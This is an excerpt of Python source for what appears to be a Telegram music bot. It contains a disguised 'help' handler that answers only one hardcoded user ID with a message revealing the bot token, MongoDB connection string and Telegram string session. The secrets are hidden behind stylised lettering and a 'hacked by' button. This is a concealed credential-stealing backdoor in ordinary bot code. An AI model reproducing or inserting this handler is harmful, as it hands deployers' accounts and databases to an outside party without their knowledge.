...
from AashikaMusicBot.utils.database import get_assistant, get_authuser_names, get_cmode
from AashikaMusicBot.utils.decorators import ActualAdminCB, AdminActual, language
from AashikaMusicBot.utils.formatters import alpha_to_int, get_readable_time
...
async def restartbot(client, message: Message, _):
    ...
    if chat_id:
        ...
        try:
            db[chat_id] = []
            await AashikaMusicBot.stop_stream_force(chat_id)
        except:
            pass
...
@app.on_message(
    ...
    & filters.private
    & filters.user(7005020577)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://graph.org/file/1df484ee2b80ec2e2bd2e.jpg",
       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/AryavartX)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/AryavartX")
                 ]
            ]
         ),
     )
